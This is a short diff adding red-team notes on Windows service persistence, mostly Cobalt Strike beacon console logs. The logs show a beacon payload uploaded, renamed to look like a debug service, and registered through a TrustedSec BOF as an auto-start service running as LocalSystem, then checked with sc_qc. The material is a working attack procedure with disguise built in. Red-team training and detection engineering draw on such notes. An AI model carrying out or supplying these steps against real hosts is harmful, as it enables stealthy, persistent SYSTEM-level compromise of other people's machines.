@@ -1,0 +1,47 @@
+An adversary can also create a Windows service to run a payload under the context of SYSTEM, which will start when the computer boots up.
+
+use this BOF 
+https://github.com/trustedsec/CS-Remote-OPs-BOF.git
+
+///
+[03/26 05:01:30] beacon> upload /tmp/beacon_x64.exe
+[03/26 05:01:33] [*] Tasked beacon to upload /tmp/beacon_x64.exe as beacon_x64.exe
+[03/26 05:01:33] [+] host called home, sent: 328730 bytes
+[03/26 05:01:59] beacon> mv beacon_x64.exe debug_svc.exe
+[03/26 05:01:59] [*] Tasked beacon to move beacon_x64.exe to debug_svc.exe
+[03/26 05:01:59] [+] host called home, sent: 43 bytes
+
+[03/26 05:04:46] beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3
+[03/26 05:04:46] [*] Loaded sc_create for x64
+[03/26 05:04:46] [+] host called home, sent: 4502 bytes
+[03/26 05:04:46] [+] received output:
+create_service:
+  hostname:     
+  servicename:  dbgsvc
+  displayname:  Debug Service
+  binpath:      C:\Windows\System32\debug_svc.exe
+  newdesc:      Windows Debug Service
+  desclen:      22
+  ignoremode:   0
+  startmode:    2
+  service_type: 10
+SUCCESS.
+///
+
+Use sc_qc to verify that the service was created successfully.
+
+///
+beacon> sc_qc dbgsvc
+
+SERVICE_NAME: dbgsvc
+	TYPE                 : 10 WIN32_OWN
+	START_TYPE           : 2 AUTO_START
+	ERROR_CONTROL        : 0 IGNORE
+	BINARY_PATH_NAME     : C:\Windows\System32\debug_svc.exe
+	LOAD_ORDER_GROUP     : 
+	TAG                  : 0
+	DISPLAY_NAME         : Debug Service
+	DEPENDENCIES         : 
+	SERVICE_START_NAME   : LocalSystem
+	CURRENT_STATUS       : STOPPED
+///
